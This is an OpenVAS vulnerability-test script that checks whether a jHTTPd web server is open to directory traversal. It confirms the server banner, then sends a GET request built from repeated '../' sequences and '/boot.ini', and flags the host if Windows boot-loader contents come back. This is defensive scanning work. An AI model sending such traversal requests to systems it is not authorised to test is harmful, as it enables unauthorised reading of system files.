###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_jhttpd_dir_traversal_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# jHTTPd Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "jHTTPd version 0.1a on windows.";
tag_insight = "The flaws are due to an error in validating backslashes in
  the filenames.";
tag_solution = "No solution or patch is available as of 30th March, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://developer.gauner.org/jhttpd/";
tag_summary = "The host is running jHTTPd and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(902404);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-04-01 15:39:52 +0200 (Fri, 01 Apr 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("jHTTPd Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17068/");

  script_description(desc);
  script_summary("Check for directory traversal vulnerability in jHTTPd");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80, 8082);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## default port
jhPort = get_http_port(default:8082);
if(!jhPort){
  jhPort = 8082;
}

if(!get_port_state(jhPort)){
  exit(0);
}

## Check the banner to confirm the server
banner = get_http_banner(port:jhPort);
if(!banner || "Server: jHTTPd" >!< banner){
 exit(0);
}

## Construct the attack exploit
data = crap(data:"../", length:16);
exp = data + "/boot.ini";

## Send the constructed exploit
sndReq= http_get(item:exp, port:jhPort);
rcvRes = http_keepalive_send_recv(port:jhPort, data:sndReq);

## Check the respone after sending exploit
if(!isnull(rcvRes) && "[boot loader]" >< rcvRes && "\WINDOWS" >< rcvRes){
  security_warning(jhPort);
}
